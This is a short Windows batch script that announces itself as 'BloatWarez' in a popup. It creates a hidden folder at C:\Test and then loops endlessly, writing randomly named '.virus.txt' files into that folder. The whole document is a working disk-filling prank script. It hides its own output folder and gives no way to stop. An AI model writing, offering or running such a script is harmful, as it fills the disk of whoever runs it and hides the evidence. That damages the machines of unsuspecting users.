@echo off
color 0a
msg * You have just launched BloatWarez %random%

if not exist "C:\Test" (
  md C:\Test
  attrib +h C:\Test
) else (
  attrib +h C:\Test
)

:Reckon
echo This is bloatware #%random% >C:\Test\%random%%random%.virus.txt
goto Reckon
